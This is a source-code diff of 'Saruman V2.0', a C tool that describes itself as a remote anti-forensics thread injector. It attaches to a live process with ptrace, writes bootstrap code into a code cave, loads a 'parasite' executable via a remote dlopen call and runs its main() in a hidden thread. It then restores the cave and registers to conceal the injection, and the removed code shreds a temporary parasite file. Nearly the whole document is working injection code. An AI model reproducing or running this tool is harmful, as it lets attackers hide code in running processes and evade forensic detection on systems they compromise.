-				switch(ELF64_R_TYPE(rel->r_info)) {
-
-					case R_X86_64_GLOB_DAT:
-
-						/* 
-						 * We actually can leave this reloc type alone because
-						 * we start executing the parasite at main() and not
-						 * _start(), so we can ignore these ones that are
-						 * necessary for initialization.
-						 */
-						continue;
-						/*
-				 		 * We must resolve this relocation type
-						 * relval = S
-						 */
-						
-						relocPtr = (Elf64_Addr *)(h->mem + h->dataOff + (rel->r_offset - h->o_dataVaddr));
-				        	symtab = (Elf64_Sym *)&h->mem[h->shdr[h->shdr[i].sh_link].sh_offset];
-                                        	symbol = (Elf64_Sym *)&symtab[ELF64_R_SYM(rel->r_info)];
-                                        	if (symbol->st_shndx > h->ehdr->e_shnum) //bug workaround
-                                                	continue;
-						for (k = 0; k < linfo[0].count; k++) {
-							if (!strcmp(&StringTable[symbol->st_name], linfo[k].name)) {
-								*(uint64_t *)relocPtr = linfo[k].resolved;	
-								break;
-							}
-						} 
-						break;
-					case R_X86_64_RELATIVE:
-						
-						/*
-						 * We must resolve this relocation type baby!
-						 * relval = B + A
-						 */
-						relocPtr = (Elf64_Addr *)(h->mem + h->dataOff + (rel->r_offset - h->o_dataVaddr));
-						symval = h->base + rel->r_addend;
-						*(uint64_t *)relocPtr = symval;
-						
-						DBG_MSG("[DEBUG]: R_X86_64_RELATIVE relocation unit given value: %lx\n", symval);
-						break;
-					case R_X86_64_64:
-						/*
-						 * We must resolve this relocation type baby!
-						 * relval = S + A
-						 */
-						relocPtr = (Elf64_Addr *)(h->mem + h->dataOff + (rel->r_offset - h->o_dataVaddr));
-						
-						/*
-						 * Get associated symbol and its value.
-						 */
-						symtab = (Elf64_Sym *)&h->mem[h->shdr[h->shdr[i].sh_link].sh_offset];
-						symbol = (Elf64_Sym *)&symtab[ELF64_R_SYM(rel->r_info)];
-						symval = symbol->st_value;
-						symval += h->base;
-						symval += rel->r_addend;
-						
-						/*	
-						 * Fixup relocation unit
-						 */
-						*(uint64_t *)relocPtr = symval;
-						
-						DBG_MSG("DEBUG R_X86_64_64 relocation computed to %lx\n", symval);
-						break;
-				} 
-			}
-		}
-	}
-
-}
-
-
-int apply_elf_relocations(handle_t *h)
-{
-	
-	/*
-	 * This handles the dynamic linking:
-	 * we bind the parasites dynamic functions
-	 * to the libc symbols mapped into the
-	 * hosts memory space.
-	 * So handle relocs of type R_X86_64_JUMP_SLOT
-	 */
-#if DEBUG
-	printf("[DEBUG] Calling fixup_got()\n");
-#endif
-	if (fixup_got(h) < 0) {
-                printf("Failed to handle libc resolution\n");
-                return -1;
-        }
- 	
-	/* 
-	 * Handle relocs of R_X86_64_GLOB_DAT, R_X86_64_RELATIVE, R_X86_64_64
-	 */
-#if DEBUG
-	printf("[DEBUG] Calling apply_relocs()\n");
-#endif
-	
-	if (apply_relocs(h) < 0) {
-		printf("Failed to handle R_X86_64_GLOB_DAT relocation types\n");
-		return -1;
-	}
-	
-
-	return 0;
-}
-
-static uint64_t get_parasite_entry(handle_t *h)
-{
-	FILE *fd;
-	char buf[256], *p, *basename;
-	Elf64_Addr entry = 0;
-	char path[256];
-
-	snprintf(path, sizeof(path) - 1, "/proc/%d/maps", h->tasks.pid);
-	if ((fd = fopen(path, "r")) == NULL) {
+	snprintf(path, 4096, "/proc/%d/maps", ctx->task.pid);
+	fp = fopen(path, "r");
+	if (fp == NULL) {
 		perror("fopen");
-		exit(-1);
+		return false;
+	}
+	/*
+	 * Find the first instance of r-xp region of the main
+	 * executable. While we're at it find the first r--p region
+	 * with a '/' in the line-- that's our base address.
+	 */
+	while (fgets(buf, sizeof(buf), fp) != NULL) {
+		if (ctx->base_vaddr == 0 && strstr(buf, "r--p") != NULL &&
+		    strchr(buf, '/') != NULL) {
+			p = strchr(buf, '-');
+			*p = '\0';
+			ctx->base_vaddr = strtoul(buf, NULL, 16);
+			saruman_debug("ctx->base_vaddr: %#lx\n", ctx->base_vaddr);
+			continue;
+		}
+		if (strstr(buf, "r-xp") == NULL)
+			continue;
+		if (strchr(buf, '/') == NULL)
+			continue;
+		p = strchr(buf, '-');
+		*p = '\0';
+		ctx->bootstrap.executable_base_addr =
+		    strtoul(buf, NULL, 16);
+		ctx->bootstrap.executable_len =
+		    strtoul((p + 1), NULL, 16) - ctx->bootstrap.executable_base_addr;
+		fclose(fp);
+		return true;
 	}
 	
-	if ((p = strrchr(h->path, '/')) != NULL) 
-		basename = strdup(p + 1);	
-	else
-		basename = strdup(h->path);
-	
-	DBG_MSG("[DEBUG] -> parasite basename: %s\n", basename);
+	fclose(fp);
+	return false;
+}
 
-	while (fgets(buf, sizeof(buf), fd)) {
-		if (strstr(buf, basename)) {
-			if (strstr(buf, "r-xp")) {
-				*(char *)strchr(buf, '\0') = '\0';
-				p = buf;
-				entry = strtoul(p, NULL, 16);
-				break;
-			}
+bool saruman_find_libc_base(struct saruman_ctx *ctx)
+{
+	FILE *fp;
+	char path[4096], buf[4096];
+	char *p;
+
+	snprintf(path, 4096, "/proc/%d/maps", ctx->task.pid);
+	fp = fopen(path, "r");
+	if (fp == NULL) {
+		perror("fopen");
+		return false;
+	}
+
+	while (fgets(buf, sizeof(buf), fp) != NULL) {
+		if (ctx->libc_base_vaddr == 0 &&
+		    strstr(buf, "/lib/x86_64-linux-gnu/libc.so.6") != NULL) {
+			if (strstr(buf, "r--p") == NULL)
+				continue;
+			p = strchr(buf, '-');
+			*p = '\0';
+			ctx->libc_base_vaddr = strtoul(buf, NULL, 16);
+			fclose(fp);
+			return true;
 		}
 	}
-	fclose(fd);				
-	return entry;
+	fclose(fp);
+	return false;
 }
 
-static int write_to_disk(handle_t *h)
+bool saruman_store_register_state(struct saruman_ctx *ctx)
 {
-	int fd;
-
-	unlink(TMP_PATH);
-
-	fd = open(TMP_PATH, O_RDWR|O_CREAT|O_TRUNC);
-	if (fd < 0) {
-		perror("write_to_disk: open");
-		return -1;
-	}
-	if (write(fd, h->mem, h->st.st_size) != h->st.st_size) {
-		perror("write_to_disk: write");
-		return -1;
+	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &ctx->o_pt_regs) < 0) {
+		perror("PTRACE_GETREGS");
+		return false;
 	}
 
-	close(fd);
-	return 0;
+	memcpy((void *)&ctx->pt_regs,
+	    (void *)&ctx->o_pt_regs,
+	    sizeof(struct user_regs_struct));
+	return true;
 }
 
-void exec_cmd (char *str, ...)
+bool saruman_restore_register_state(struct saruman_ctx *ctx)
 {
-        char string[1024];
-        va_list va;
-
-        va_start (va, str);
-        vsnprintf (string, 1024, str, va);
-        va_end (va);
-        system (string);
+	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &ctx->o_pt_regs) < 0) {
+		perror("PTRACE_SETREGS");
+		return false;
+	}
+	return true;
 }
+
+void saruman_remote_call_init(struct saruman_rpc *rpc, void *fn, size_t fn_len,
+    char **args, int argc) 
+{
+	rpc->fn = (void *)fn;
+	rpc->fn_len = fn_len;
+	rpc->args = args;
+	rpc->argc = argc;
+	return;
+}
+
+bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
+{
+	bool res;
+	uint64_t addr, exec_rsp;
+	int status;
+	struct user_regs_struct *pt_regs;
+
+	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &rpc->o_pt_regs) < 0) {
+		perror("ptrace");
+		return false;
+	}
+
+	memcpy(&rpc->n_pt_regs, &rpc->o_pt_regs, sizeof(struct user_regs_struct));
+
+	addr = ctx->bootstrap_phase_complete ?
+	    PT_CALL_REGION : ctx->bootstrap.executable_base_addr;
+
+	saruman_debug("Writing %zu bytes from %p to %#lx\n", rpc->fn_len, rpc->fn, addr);
 	
+	if (ctx->bootstrap_phase_complete == false) {
+		res = saruman_backup_cave(ctx, addr, rpc->fn_len);
+		if (res == false) {
+			fprintf(stderr, "saruman_backup_cave() failed\n");
+			return false;
+		}
+	}
+	res = saruman_ptrace_write(ctx, (void *)addr, rpc->fn, rpc->fn_len);
+	if (res == false) {
+		fprintf(stderr, "saruman_ptrace_write() failed on pid %d\n", ctx->task.pid);
+		return false;
+	}
+
+	saruman_debug("Setting pt_regs.rip to %#lx\n", addr);
+
+	pt_regs = &rpc->n_pt_regs;
+	pt_regs->rip = addr;
+	if ((long)pt_regs->orig_rax >= 0) {
+		pt_regs->orig_rax = -1;
+	}
+	if (ctx->bootstrap_phase_complete == true) {
+		if ((ctx->stack.rsp % 16) != 8) {
+			saruman_debug("Re-aligning stack to 8 bit align\n");
+			ctx->stack.rsp -= 8;
+		}
+		pt_regs->rsp = ctx->stack.rsp; //SySv wants rsp % 16 == 8
+		saruman_debug("pt_regs->rsp is set to %#llx\n", pt_regs->rsp);
+	}
+
+	saruman_debug("rdi: %p rsi %p rdx %p rcx %p r8 %p\n",
+			rpc->args[0],rpc->args[1],rpc->args[2],rpc->args[3],rpc->args[4]);
+	switch(rpc->argc) {
+	case 1:
+		pt_regs->rdi = (uintptr_t)rpc->args[0];
+		break;
+	case 2:
+		pt_regs->rdi = (uintptr_t)rpc->args[0];
+		pt_regs->rsi = (uintptr_t)rpc->args[1];
+		break;
+	case 3:
+		pt_regs->rdi = (uintptr_t)rpc->args[0];
+		pt_regs->rsi = (uintptr_t)rpc->args[1];
+		pt_regs->rdx = (uintptr_t)rpc->args[2];
+		break;
+	case 4:
+		pt_regs->rdi = (uintptr_t)rpc->args[0];
+		pt_regs->rsi = (uintptr_t)rpc->args[1];
+		pt_regs->rdx = (uintptr_t)rpc->args[2];
+		pt_regs->rcx = (uintptr_t)rpc->args[3];
+		break;
+	case 5:
+		pt_regs->rdi = (uintptr_t)rpc->args[0];
+		pt_regs->rsi = (uintptr_t)rpc->args[1];
+		pt_regs->rdx = (uintptr_t)rpc->args[2];
+		pt_regs->rcx = (uintptr_t)rpc->args[3];
+		pt_regs->r8 =  (uintptr_t)rpc->args[4];
+		break;
+	case 6:
+		pt_regs->rdi = (uintptr_t)rpc->args[0];
+		pt_regs->rsi = (uintptr_t)rpc->args[1];
+		pt_regs->rdx = (uintptr_t)rpc->args[2];
+		pt_regs->rcx = (uintptr_t)rpc->args[3];
+		pt_regs->r8 =  (uintptr_t)rpc->args[4];
+		pt_regs->r9 =  (uintptr_t)rpc->args[5];
+		break;
+	}
+
+	/*
+	 * Set the new register state
+	 * */
+	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &rpc->n_pt_regs) < 0) {
+		perror("ptrace setregs");
+		return false;
+	}
+	if (ptrace(PTRACE_CONT, ctx->task.pid, NULL, NULL) < 0) {
+		perror("ptrace cont");
+		return false;
+	}
+	waitpid2(ctx->task.pid, &status, 0);
+
+	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &rpc->n_pt_regs) < 0) {
+		perror("ptrace setregs");
+		return false;
+	}
+	saruman_debug("rip is set to: %#llx\n", rpc->n_pt_regs.rip);
+
+	if (WSTOPSIG(status) != SIGTRAP) {
+		fprintf(stderr,
+		    "[!] No SIGTRAP received, something went wrong. Signal: %d\n",
+		    WSTOPSIG(status));
+		return false;
+	}
+	/* Get return value */
+	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &rpc->n_pt_regs) < 0) {
+		perror("PTRACE_GETREGS");
+		return false;
+	}
+	rpc->retval = pt_regs->rax;
+	/*
+	 * Restore the old register state back.
+	 */
+	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &rpc->o_pt_regs) < 0) {
+		perror("ptrace setregs");
+		return false;
+	}
+	return true;
+}
+
+uint64_t saruman_push_string(struct saruman_ctx *ctx, char *string)
+{
+	size_t len = strlen(string) + 1;
+	size_t i;
+	bool res;
+
+	len = (len + 15) & ~15;
+
+	uint8_t *ptr = (uint8_t *)ctx->stack.rsp - len;
+
+	saruman_debug("Calling ptrace_write(), writing string '%s' to %p\n", string, ptr);
+
+	res = saruman_ptrace_write(ctx, ptr, string, len);
+	if (res == false) {
+		fprintf(stderr, "saruman_ptrace_write() failed on %d\n", ctx->task.pid);
+		exit(EXIT_FAILURE);
+	}
+	ctx->stack.rsp -= len;
+	return ctx->stack.rsp;
+}
+
+/*
+ * Call function: bootstrap_code(PT_CALL_REGION, PT_CALL_REGION_SIZE, NULL);
+ * remotely in the target process.
+ */
+bool saruman_run_bootstrap(struct saruman_ctx *ctx, uint64_t *retval)
+{
+	struct saruman_rpc rpc;
+
+	saruman_debug("Writing %i bytes of bootstrap code into %p\n",
+	     1024, (void *)ctx->bootstrap.executable_base_addr);
+
+	char *argv[] = {(void *)PT_CALL_REGION, (void *)PT_CALL_REGION_SIZE, (void *)0x0};
+	saruman_remote_call_init(&rpc, &bootstrap_code, 1024, argv, 3);
+	if (saruman_remote_call(ctx, &rpc) == false) {
+		fprintf(stderr, "saruman_remote_call() failed on: run_bootstrap()\n");
+		return false;
+	}
+	ctx->bootstrap_phase_complete = true;
+	*retval = rpc.retval;
+	return true;
+}
+
+bool saruman_find_libc_dlopen(struct saruman_ctx *ctx, uint64_t *value)
+{
+	elf_error_t elf_error;
+	struct elf_symbol symbol;
+
+	if (ctx->libc.elfobj == NULL) {
+		ctx->libc.elfobj = malloc(sizeof(elfobj_t));
+		if (ctx->libc.elfobj == NULL) {
+			perror("malloc");
+			return false;
+		}
+		if (elf_open_object(LIBC_PATH, ctx->libc.elfobj,
+		    ELF_LOAD_F_STRICT, &elf_error) == false) {
+			fprintf(stderr, "elf_open_object() failed on %s: %s\n",
+			    LIBC_PATH, elf_error_msg(&elf_error));
+			return false;
+		}
+	}
+	if (elf_symbol_by_name(ctx->libc.elfobj, "dlopen", &symbol) == false) {
+		fprintf(stderr, "elf_symbol_by_name() failed on: \"dlopen\"\n");
+		return false;
+	}
+	symbol.value += ctx->libc_base_vaddr;
+	memcpy(value, &symbol.value, sizeof(uint64_t));
+	return true;
+}
+
+bool saruman_find_libc_dlerror(struct saruman_ctx *ctx, uint64_t *value)
+{
+	elf_error_t elf_error;
+	struct elf_symbol symbol;
+
+	if (ctx->libc.elfobj == NULL) {
+		ctx->libc.elfobj = malloc(sizeof(elfobj_t));
+		if (ctx->libc.elfobj == NULL) {
+			perror("malloc");
+			return false;
+		}
+		if (elf_open_object(LIBC_PATH, ctx->libc.elfobj,
+		    ELF_LOAD_F_STRICT, &elf_error) == false) {
+			fprintf(stderr, "elf_open_object() failed on %s: %s\n",
+			    LIBC_PATH, elf_error_msg(&elf_error));
+			return false;
+		}
+	}
+	if (elf_symbol_by_name(ctx->libc.elfobj, "dlerror", &symbol) == false) {
+		fprintf(stderr, "elf_symbol_by_name() failed on: \"dlerror\"\n");
+		return false;
+	}
+	symbol.value += ctx->libc_base_vaddr;
+	memcpy(value, &symbol.value, sizeof(uint64_t));
+}
+
+/*
+ * This function removes the PIE flag from DT_FLAGS_1
+ * in the dynamic segment, otherwise dlopen() won't
+ * load the executable.
+ */
+bool saruman_remove_pie_flag(struct saruman_ctx *ctx)
+{
+	elf_dynamic_entry_t d_entry;
+	elf_dynamic_iterator_t d_iter;
+	elf_error_t error;
+	bool res;
+
+	if (ctx->elfobj == NULL) {
+		ctx->elfobj = malloc(sizeof(elfobj_t));
+		if (ctx->elfobj == NULL) {
+			perror("malloc");
+			return false;
+		}
+		if (elf_open_object(ctx->exec_path, ctx->elfobj,
+		    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
+			fprintf(stderr, "elf_open_object() failed on %s: %s\n",
+			    ctx->exec_path, elf_error_msg(&error));
+			return false;
+		}
+	}
+
+	elf_dynamic_iterator_init(ctx->elfobj, &d_iter);
+	for (;;) {
+		res = elf_dynamic_iterator_next(&d_iter, &d_entry);
+		if (res == ELF_ITER_DONE)
+			break;
+		if (res == ELF_ITER_ERROR) {
+			fprintf(stderr, "elf_dynamic_iterator_next failed\n");
+			return false;
+		}
+		if (d_entry.tag == DT_FLAGS_1) {
+			uint64_t tval = d_entry.value & ~(uint64_t)DF_1_PIE;
+			if (elf_dynamic_set_value(&d_iter, tval) == false) {
+				fprintf(stderr, "Failed to remove DF_1_PIE flag from binary\n");
+				return false;
+			}
+			return true;
+		}
+	}
+	return false;
+}
+
+bool saruman_find_injected_base(struct saruman_ctx *ctx)
+{
+	FILE *fp;
+	char path[4096], buf[4096];
+	char *p, *name, *newline;
+
+	name = strrchr(ctx->exec_path, '/');
+	if (name != NULL)
+		name += 1;
+
+	snprintf(path, 4096, "/proc/%d/maps", ctx->task.pid);
+	fp = fopen(path, "r");
+	if (fp == NULL) {
+		perror("fopen");
+		return false;
+	}
+		
+	while (fgets(buf, sizeof(buf), fp) != NULL) {
+		p = strrchr(buf, '/');
+		if (p == NULL)
+			continue;
+		newline = strchr(p + 1, '\n');
+		*newline = '\0';
+		if (strcmp((p + 1), name) == 0) {
+			p = strchr(buf, '-');
+			*p = '\0';
+			ctx->parasite.base_vaddr = strtoul(buf, NULL, 16);
+			fclose(fp);
+			return true;
+		}
+	}
+	fclose(fp);
+	return false;
+}
+
 int main(int argc, char **argv)
 {
-	handle_t parasite;
-	int (*run_exec_loader_fn)(handle_t *) = run_exec_loader_dlopen; //default mode is to use dlopen
-	int (*launch_parasite_fn)(handle_t *) = dlopen_launch_parasite; //default mode is to use dlopen
+	char **main_argv;
+	struct saruman_ctx saruman;
+	struct saruman_rpc rpc;
+	uint64_t retval, dlopen_addr, dlerror_addr;
+	struct elf_symbol symbol;
+	bool res;
+	int i, main_argc;
 
-	char **args, **pargs;
-	int target_argc;
-	int i;
+	memset(&saruman, 0, sizeof(saruman));
 
-	if (argc < 3) {
-		printf("Usage: %s [--no-dlopen] <pid> <parasite> <parasite_args>\n", argv[0]);
-		exit(0);
+	if (argc < 2) {
+		printf("---------------[Saruman V2.0]--------------\n");
+		printf("Saruman's remote anti-forensics thread injector\n");
+		printf("Usage: %s <pid> <exec_path> <exec_args>\n", argv[0]);
+		exit(EXIT_FAILURE);
 	}
-	
-	opts.no_dlopen = 0;
-	
-	args = &argv[1];
-	target_argc = argc - 2;  
-	/*
-	 * target_argc should be how many args from ./parasite program
- 	 * including the program name itself and any args after it.
- 	 * I.E ./parasite <arg1> <arg2> would be target_argc 3
-	 */
-	if (!strcmp(argv[1], "--no-dlopen")) {
-		opts.no_dlopen = 1;
-		args = &argv[2];
-		target_argc = argc - 3;
-	}
-	
-	arginfo.argc = target_argc;
-	
-	printf("Parasite command: ");
-	for (i = 0, pargs = &args[1]; i < target_argc; i++) {
-		arginfo.args[i] = strdup(pargs[i]);
-		printf("%s ", arginfo.args[i]);
-	}
-	printf("\n");
 
-	parasite.tasks.pid = atoi(args[0]);
-	printf("[+] Target pid: %d\n", parasite.tasks.pid);
-
-	if (opts.no_dlopen) {
-	printf("Calling randomize base\n");
-	parasite.base = randomize_base();
-	do {
-		parasite.base = randomize_base();
-	} 	while(parasite.base == 0);
-		printf("[+] Using base %lx\n", parasite.base);
-
-	}
-	printf("[+] map_elf_binary(ptr, %s)\n", args[1]);
-	if (map_elf_binary(&parasite, args[1]) < 0) {
-		printf("Unable to load: %s\n", args[1]);
-		exit(-1);
-	}
-	
-	prepare_fn_payloads(&parasite.payloads, &parasite);
-	
-	if (opts.no_dlopen) {
-		printf("[+] Applying ELF relocations manually\n");
-		if (apply_elf_relocations(&parasite) < 0) {
-			printf("Failed to apply relocations\n");
-			exit(-1);
-		}
-	} 
-
-	/*
-	 * Write a relocated version of parasite executable
-	 * to disk /tmp/.parasite.elf. This is the version
-	 * of our parasite executable that will be loaded into memory.
-	 * since it has relocation information applied.
-	 */
-
-	if (opts.no_dlopen) {
-		printf("[+] Writing temporary relocated version of file (FIXME, TOUCHES DISK IN EXTRA PLACE)\n");
-		if (write_to_disk(&parasite) < 0) {
-			printf("[!] Unable to write relocated parasite to temporary location\n");
-			goto done;
+	for (i = 0; i < strlen(argv[1]); i++) {
+		if (!isdigit(argv[1][i])) {
+			fprintf(stderr, "Arg1 is should be a numerical PID\n");
+			exit(EXIT_FAILURE);
 		}
 	}
-
-
-	if (pid_attach(&parasite) < 0) 
-		goto done;
+	saruman.task.pid = atoi(argv[1]);
+	saruman.exec_path = strdup(argv[2]);
+	if (saruman.exec_path == NULL) {
+		perror("strdup");
+		exit(EXIT_FAILURE);
+	}
 	
-	printf("[+] calling bootstrap\n");
-	
-	if (backup_regs_struct(&parasite) < 0)
-		goto done;
+	if (saruman_remove_pie_flag(&saruman) == false) {
+		fprintf(stderr, "failed to remove DT_FLAG_1 PIE flag\n");
+		exit(EXIT_FAILURE);
+	}
 
-	/* 	
-	 * Inject and execute bootstrap_code()
-	 */
-	run_bootstrap(&parasite);
-	
-	printf("[+] calling exec_loader\n");
+	fprintf(stdout, "Attaching to PID: %d\n", saruman.task.pid);
+	fprintf(stdout, "Injecting: %s\n", saruman.exec_path);
+
+	saruman.args.argv = &argv[2];
+	argc = argc - 1;
+
+	saruman_debug("PTRACE ATTACH\n");
+	if (saruman_ptrace_attach(&saruman) == false) {
+		fprintf(stderr, "saruman_ptrace_attach() failedon pid: %d\n",
+		    saruman.task.pid);
+		exit(EXIT_FAILURE);
+	}
+
+	saruman_debug("STORE REGISTER STATE\n");
+	if (saruman_store_register_state(&saruman) == false) {
+		fprintf(stderr, "saruman_store_register_state() failedon pid: %d\n",
+		    saruman.task.pid);
+		exit(EXIT_FAILURE);
+	}
+
+	if (saruman_find_libc_base(&saruman) == false) {
+		fprintf(stderr, "Failed to find libc.so.6 base address in memory\n");
+		exit(EXIT_FAILURE);
+	}
+
+	printf("Finding bootloader cave\n");
+
+	if (saruman_find_bootloader_cave(&saruman) == false) {
+		fprintf(stderr, "saruman_find_bootloader_cave() failed on pid: %d\n",
+		    saruman.task.pid);
+		exit(EXIT_FAILURE);
+	}
+	printf("Bootstrap executable region: %#lx - %#lx\n",
+	    saruman.bootstrap.executable_base_addr,
+	    saruman.bootstrap.executable_base_addr + saruman.bootstrap.executable_len);
+
+	if (saruman_run_bootstrap(&saruman, &retval) == false) {
+		fprintf(stderr, "saruman_run_bootstrap() failed\n");
+		exit(EXIT_FAILURE);
+	}
+	saruman.stack.len = STACK_SIZE;
+	saruman.stack.base = (void *)retval;
+	saruman.stack.rsp = ((uint64_t)retval + saruman.stack.len);
+
+	printf("bootstrap complete, stack base: %p\n", saruman.stack.base);
+	printf("rsp initialized to %#lx\n", saruman.stack.rsp);
 	/*
-	 * Inject and execute load_exec()
+	 * Call dlopen_loader(exec_path, exec_args, parasite_argc)
 	 */
-	if (opts.no_dlopen) {
-		printf("[+] manual elf exec_loader\n");
-		run_exec_loader_fn = run_exec_loader;
-	} else
-		printf("[+] dlopen elf exec_loader\n");
-	
-	run_exec_loader_fn(&parasite);
 
+	res = saruman_find_libc_dlopen(&saruman, &dlopen_addr);
+	if (res == false) {
+		fprintf(stderr, "Failed to find dlopen()\n");
+		exit(EXIT_FAILURE);
+	}
+
+	printf("Calling dlopen_loader remotely, dlopen() is at %p\n", (void *)dlopen_addr);
+	/*
+	 * Push the pathname string onto the remote process stack that we initialized
+	 * in the bootstrap code. This is necessary for injected code to access
+	 * memory.
+	 */
+	char *exec_path = (char *)saruman_push_string(&saruman, argv[2]);
+
+	/*
+	 * Setup RPC args to call dlopen_loader(path, dlopen_vaddr);
+	 */
+	char *dlopen_loader_args[] = {exec_path, (char *)dlopen_addr};
+	saruman_remote_call_init(&rpc, &dlopen_loader, 1024,
+	    dlopen_loader_args, 2);
+	saruman_remote_call(&saruman, &rpc);
+	
+	saruman_debug("Handle: %p\n", (void *)rpc.retval);
+	printf("Successfully injected executable '%s' into memory\n", argv[2]);
+
+	if (saruman_find_injected_base(&saruman) == false) {
+		fprintf(stderr, "Failed to find base address of injected: %s\n", argv[2]);
+		exit(EXIT_FAILURE);
+	}
+	
+	if (elf_symbol_by_name(saruman.elfobj, "main", &symbol) == false) {
+		fprintf(stderr, "elf_symbol_by_name() failed on main\n");
+		exit(EXIT_FAILURE);
+	}
+	saruman_debug("The symbol main: %#lx\n", symbol.value);
+	saruman.parasite.entry_point = saruman.parasite.base_vaddr + symbol.value;
+	printf("Entry point of parasite main(): %#lx\n", saruman.parasite.entry_point);
+
+	/*
+	 * If debug is on then call dlerror to see why dlopen is failing
+	 */
 #if DEBUG
-	system("pmap `pidof host`");
-#endif
-	
-	if (opts.no_dlopen == 0) {
-		uint64_t entrypoint = get_parasite_entry(&parasite);
-		if (entrypoint == 0) {
-			printf("get_parasite_entry() failed\n");
-			goto done;
+	if ((void *)rpc.retval == NULL) {
+		res = saruman_find_libc_dlerror(&saruman, &dlerror_addr);
+
+		saruman_debug("Calling a remote dlerror()\n");
+		char *dlerror_loader_args[] = {(char *)dlerror_addr};
+		saruman_remote_call_init(&rpc, &dlerror2, 1024, dlerror_loader_args, 1);
+		saruman_remote_call(&saruman, &rpc);
+
+		saruman_debug("Reading from rpc.retval: %p\n", (void *)rpc.retval);
+		char tmp[32];
+
+		if (saruman_ptrace_read(&saruman, tmp, (void *)rpc.retval, 32) == false) {
+			fprintf(stderr, "saruman_ptrace_read() failed\n");
+			exit(EXIT_FAILURE);
 		}
-		entrypoint += (uint64_t)parasite.entryp;
-		parasite.entryp = (void *)entrypoint;
+		if (rpc.retval != 0)
+			saruman_debug("dlerror msg: %s\n", tmp);
 	}
+#endif
 
 	/*
-	 * Pass control to parasite
+	 * A remote call to creat_thread() will begin execution at main() but we need to have
+	 * the char **argv ascii data stored into remote stack memory before-hand.
 	 */
-	printf("[+] calling launch_parasite()\n");
-	
-	if (opts.no_dlopen) 
-		launch_parasite_fn = launch_parasite;
+	for (i = 0; i < argc - 1; i++) {
+		if (i >= MAX_ARGV_LEN) {
+			fprintf(stderr, "Too many argv entries to main()\n");
+			exit(EXIT_FAILURE);
+		}
+		saruman_debug("Pushing: %s\n", argv[i + 2]);
+		saruman.parasite.main_argv[i] =
+		    (char *)saruman_push_string(&saruman, argv[i + 2]);
+		saruman_debug("saruman.parasite.main_argv[%d] = %p\n",
+		    i, saruman.parasite.main_argv[i]);
+	}
+    	saruman.parasite.main_argc = argc - 1;
 
-	if (launch_parasite_fn(&parasite) < 0)
-		goto done;
-	
-	if (restore_regs_struct(&parasite) < 0) 
-		goto done;
-	
-	if (pid_detach_stateful(&parasite) < 0)
-		goto done;
+	/*
+	 * Copy char **argv array of pointers to remote stack
+	 * so that the remote main() can be called.
+	 */
+	size_t nptr = (size_t)(saruman.parasite.main_argc + 1) * 8;
+	uint64_t remote_argv, z = 0;
 
-	kill(parasite.tasks.pid, SIGCONT);
-	
-done:
-	if (access(TMP_PATH, F_OK) == 0) {
-		exec_cmd("shred %s", TMP_PATH);
-		if (access(TMP_PATH, F_OK) == 0)
-			exec_cmd("rm %s", TMP_PATH);
+	saruman.stack.rsp &= ~0xfUL;
+	saruman.stack.rsp -= nptr;
+	remote_argv = saruman.stack.rsp;
+
+	/*
+	 * Write argv[0 ... N] to remote stack.
+	 */
+	for (i = 0; i < saruman.parasite.main_argc; i++) {
+	    uint64_t p = (uint64_t)saruman.parasite.main_argv[i];
+	    if (!saruman_ptrace_write(&saruman,
+		(void *)(remote_argv + (uint64_t)i * 8),
+		&p, sizeof(p))) {
+		fprintf(stderr, "failed to write argv[%d]\n", i);
+		exit(EXIT_FAILURE);
+	    }
+	}
+	/*
+	 * Write terminating NULL to and of argv array
+	 * */
+	if (!saruman_ptrace_write(&saruman,
+	    (void *)(remote_argv +
+		(uint64_t)saruman.parasite.main_argc * 8),
+	    &z, sizeof(z))) {
+	    fprintf(stderr, "failed to write argv NULL\n");
+	    exit(EXIT_FAILURE);
+	}
+
+	saruman_debug("remote argv @ %#lx argc=%d\n",
+	    remote_argv, saruman.parasite.main_argc);
+
+	saruman.stack.rsp -= 0x400;
+	saruman.stack.rsp &= ~0xfUL;
+
+	char *pthread_args[] = {
+	    (char *)saruman.parasite.entry_point,
+	    NULL,
+	    (char *)saruman.stack.rsp,
+	    (char *)(uintptr_t)saruman.parasite.main_argc,
+	    (char *)(uintptr_t)remote_argv
+	};
+
+	saruman_remote_call_init(&rpc, &create_thread, 1024,
+	    pthread_args, 5);
+
+	saruman_debug("Calling &create_thread(%#lx, NULL, %#lx, %d, %#lx\n",
+	    saruman.parasite.entry_point, saruman.stack.rsp, saruman.parasite.main_argc,
+	    remote_argv);
+
+	if (saruman_remote_call(&saruman, &rpc) == false) {
+	    fprintf(stderr,
+		"saruman_remote_call() failed on create_thread()\n");
+	    exit(EXIT_FAILURE);
+	}
+
+	printf("Restoring code cave of host executable\n");
+
+	if (saruman_restore_cave(&saruman) == false) {
+		fprintf(stderr, "Failed restoring code cave in text region of main executable\n");
+		exit(EXIT_FAILURE);
+	}
+
+	printf("Restoring register state of host executable\n");
+
+	if (saruman_restore_register_state(&saruman) == false) {
+		fprintf(stderr, "Failed to restore register state with PTRACE\n");
+		exit(EXIT_FAILURE);
+	}
+
+	printf("Detaching from %d\n", saruman.task.pid);
+
+	if (saruman_ptrace_detach(&saruman) == false) {
+		fprintf(stderr, "saruman_ptrace_detach() failed on %d\n", saruman.task.pid);
+		exit(EXIT_FAILURE);
 	}
 
 	exit(0);
-	
 }
